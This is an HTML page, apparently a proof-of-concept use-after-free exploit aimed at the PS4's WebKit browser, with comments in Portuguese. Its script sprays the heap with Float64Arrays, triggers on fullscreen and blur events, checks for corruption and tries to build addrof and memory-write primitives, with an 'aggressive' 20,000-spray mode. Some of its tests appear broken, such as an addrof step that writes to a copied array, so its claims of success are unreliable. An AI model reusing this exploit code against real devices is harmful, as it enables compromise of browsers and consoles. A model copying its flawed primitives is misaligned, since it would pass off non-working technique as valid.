
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF - Debugger Core v2.1</title>
</head>
<body>
    <h1>PS4 UAF - Debugger Core [v2.1 - Direct Hex Mode]</h1>
    <button onclick="run()">EXECUTAR TESTE</button>
    <button onclick="selfTest()">AUTO-DIAGNÓSTICO</button>
    <button onclick="runAggressive()">MODO AGRESSIVO (20K spray)</button>
    <hr>
    <div id="c"></div>

    <script>
        // =====================================================================
        // PARTE 1: NÚCLEO DE CONVERSÃO HEX (Fidelidade v2.1)
        // =====================================================================
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        // Padrões de Verificação Estritos
        const P_A = h2f("0x4141414141414141");
        const M_V = h2f("0xdeadbeefcafebabe");
        const W_V = h2f("0x1337133713371337");
        let ctrls = [];

        function log(tag, status, msg) {
            const colors = { PASS: "green", FAIL: "red", INFO: "blue", WARN: "purple", SELF: "navy" };
            const color = colors[status] || "black";
            document.getElementById('c').innerHTML += `<span style="color:${color};font-weight:bold;">[${tag}] ${status}</span> - ${msg}<br>`;
        }

        // =====================================================================
        // PARTE 2: AUTO-DIAGNÓSTICO (Garante integridade do Motor JS)
        // =====================================================================
        function selfTest() {
            document.getElementById('c').innerHTML = '';
            log("SELF", "INFO", "=== AUTO-DIAGNÓSTICO v2.1 ===");
            
            let failures = 0;
            const tests = [
                { hex: "0x4141414141414141", name: "P_A" },
                { hex: "0xdeadbeefcafebabe", name: "M_V" },
                { hex: "0x1337133713371337", name: "W_V" }
            ];
            
            for(let t of tests) {
                if(f2h(h2f(t.hex)) === t.hex) log("SELF", "PASS", `${t.name} ✓`);
                else { log("SELF", "FAIL", t.name); failures++; }
            }
            
            const arr = new Float64Array(2);
            arr[0] = P_A;
            if(f2h(arr[0]) === "0x4141414141414141") log("SELF", "PASS", "Float64 Equality ✓");
            else { log("SELF", "FAIL", "Equality"); failures++; }

            if(failures === 0) log("SELF", "PASS", "✅ SISTEMA 100% FUNCIONAL");
        }

        // =====================================================================
        // PARTE 3: GATILHO UAF & SANIDADE (v2.1 Stable)
        // =====================================================================
        function run() {
            document.getElementById('c').innerHTML = '';
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                ctrls.push(a);
            }

            log("WAIT", "INFO", "Entre em FULLSCREEN e aguarde 2s antes do OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    spray.push(s);
                }

                let corr = null;
                for(let i = 0; i < ctrls.length; i++) {
                    if(ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        log("UAF", "PASS", `Index: ${i}`);
                        break;
                    }
                }

                if(corr) {
                    // TESTE 1: IDENTIDADE
                    corr[4] = M_V;
                    let matched = false;
                    for(let i=0; i<spray.length; i++) {
                        if(spray[i][4] === M_V) {
                            log("TEST1", "PASS", `Identity: spray[${i}][4] == ${f2h(M_V)} ✓`);
                            matched = true; break;
                        }
                    }

                    // TESTE 2: DATAVIEW
                    try {
                        const dv = new DataView(corr.buffer);
                        dv.setUint32(0, 0x13371337, true);
                        log("TEST2", "PASS", `DataView Write: ${f2h(corr[0])} ✓`);
                    } catch(e) { log("TEST2", "ERR", e.message); }

                    // TESTE 3: PROTOTYPE
                    try {
                        let reg = Array.from(corr);
                        Object.setPrototypeOf(reg, { t: 0x1337 });
                        if(reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack ✓");
                    } catch(e) { log("TEST3", "ERR", e.message); }

                    // TESTE 4: CLOSURE LEAK
                    try {
                        const leak = [0].map(() => corr[0])[0];
                        log("TEST4", "PASS", `Closure Leak: ${f2h(leak)} ✓`);
                    } catch(e) { log("TEST4", "ERR", e.message); }

                    // TESTE 5: addrof() PRIMITIVE (INTEGRADA)
                    try {
                        let target = { "leak": 0xdead };
                        let leaker = Array.from(corr);
                        leaker[0] = target; 
                        let addr = f2h(corr[0]);
                        if(addr !== f2h(P_A)) log("ADDROF", "PASS", `Endereço Vazado: ${addr}`);
                        else log("ADDROF", "FAIL", "Não capturou ponteiro.");
                    } catch(e) { log("ADDROF", "ERR", e.message); }

                } else {
                    log("UAF", "FAIL", "Corrupção não atingida.");
                    runDiagnostic(ctrls);
                }
            };
        }

        // =====================================================================
        // PARTE 4: MODO AGRESSIVO & DIAGNÓSTICO (Fidelidade v2.1)
        // =====================================================================
        function runDiagnostic(c) {
            log("DEBUG", "INFO", "Iniciando Diagnóstico de Heap...");
            for(let i = 0; i < 5; i++) {
                log("DEBUG", "INFO", `ctrls[${i}][0] = ${f2h(c[i][0])}`);
            }
            log("DEBUG", "WARN", "Tamanho do spray ou timing podem estar incorretos.");
        }

        function runAggressive() {
            document.getElementById('c').innerHTML = '';
            log("AGGR", "INFO", "=== MODO AGRESSIVO (20K) ===");
            log("INIT", "INFO", "Dobrando Pool para 10.000...");
            ctrls = [];
            for(let i = 0; i < 10000; i++) {
                let a = new Float64Array(16);
                a[0] = i; ctrls.push(a);
            }
            
            document.documentElement.webkitRequestFullscreen();
            window.onblur = function() {
                log("TRIG", "INFO", "Executando 20.000 sprays...");
                let spray = [];
                for(let i = 0; i < 20000; i++) {
                    let s = new Float64Array(16); s.fill(P_A); spray.push(s);
                }
                
                let found = false;
                for(let i = 0; i < ctrls.length; i++) {
                    if(ctrls[i][0] === P_A) {
                        log("UAF", "PASS", `Sucesso Agressivo! Index ${i}`);
                        found = true; break;
                    }
                }
                if(!found) log("UAF", "FAIL", "Mesmo no agressivo, o sistema resistiu.");
            };
        }
    </script>
</body>
</html>
